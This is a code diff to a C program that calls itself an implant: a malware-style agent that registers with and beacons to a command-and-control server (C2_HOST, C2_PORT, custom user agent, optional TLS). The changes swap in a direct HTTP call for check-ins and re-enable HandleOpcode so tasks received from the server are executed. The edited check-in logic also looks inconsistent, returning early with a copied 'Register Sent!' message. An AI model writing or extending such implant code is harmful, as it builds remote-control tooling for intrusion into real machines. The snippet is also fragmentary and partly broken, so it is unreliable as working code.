@@ -1,5 +1,5 @@
 #define PB_ENABLE_MALLOC 1
-#include "debug.h"
+#include "include/debug.h"
 
 #include "implant.h"
 
@@ -7,7 +7,7 @@
 
 #include "include/execute.h"
 #include "include/httpclient.h"
-#include "http_client.h"
+//#include "http_client.h"
 
 #include <stdio.h>
 #include <string.h>
@@ -218,7 +218,7 @@ int RegisterSelf() {
     if (response != NULL) {
         DEBUG_PRINTF("Register Sent!\n");
         free(response);
-        return TRUE;
+        return 0;
     }
     /**
 	if (strcmp((const char *)response, (const char *)REGISTRATION_SUCCESSFUL)){
@@ -242,8 +242,16 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
     size_t inboundBufferSize = 0;
 	BYTE *outboundBuffer = EncodeImplantCheckin(&ic, &outboundBufferSize);
 	
-    LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);
-	
+    // LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);
+
+	LPBYTE response = HTTPRequest(POST_VERB, C2_HOST, CHECKIN_PATH, C2_PORT, C2_UA				, outboundBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);
+    if (response != NULL) {
+        DEBUG_PRINTF("Register Sent!\n");
+        free(response);
+        return TRUE;
+    }
+
+
 	FreeTaskResponse(tResp);
 	free(outboundBuffer);
 	
@@ -362,7 +370,7 @@ int main() {
 		
 		if (DoCheckin(&tResp, &tReq) && tReq.TaskID != NULL) {
 			DEBUG_PRINTF("[+] NEW TASK RECIEVED.\n");
-			// HandleOpcode(&tReq, &tResp);
+			HandleOpcode(&tReq, &tResp);
 		} else {
 			// No task to perform, null out the TaskResponse
 			memset(&tResp, 0, sizeof(TaskResponse));
